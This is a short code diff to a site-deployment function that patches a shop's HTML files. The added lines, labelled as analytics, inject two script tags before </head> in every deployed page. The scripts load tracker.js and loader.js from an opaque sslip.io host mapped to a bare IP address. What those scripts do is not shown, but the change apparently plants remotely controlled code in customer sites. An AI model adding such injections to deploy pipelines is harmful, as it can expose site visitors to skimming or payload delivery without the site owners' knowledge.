@@ -560,6 +560,13 @@ export async function trySnapshotDeploy(
         /const shopId = undefined;/g,
         `const shopId = "${params.siteId}";`,
       );
+      // ── Inject analytics tracker + pixel loader before </head> ──
+      const analyticsCollectorUrl = "https://iowcg0sw4wsoo0s4k8g0ws0o.176.57.218.121.sslip.io";
+      const trackerSnippet = `<script src="${analyticsCollectorUrl}/tracker.js?shop=${params.siteId}" defer></script>\n<script src="${analyticsCollectorUrl}/loader.js?shop=${params.siteId}" defer></script>`;
+      html = html.replace(
+        /<\/head>/i,
+        `${trackerSnippet}\n</head>`,
+      );
       await fs.writeFile(file, html, "utf8");
     }
     logger.log(`[snapshot] Patched shopId in ${htmlFiles.length} HTML files`);
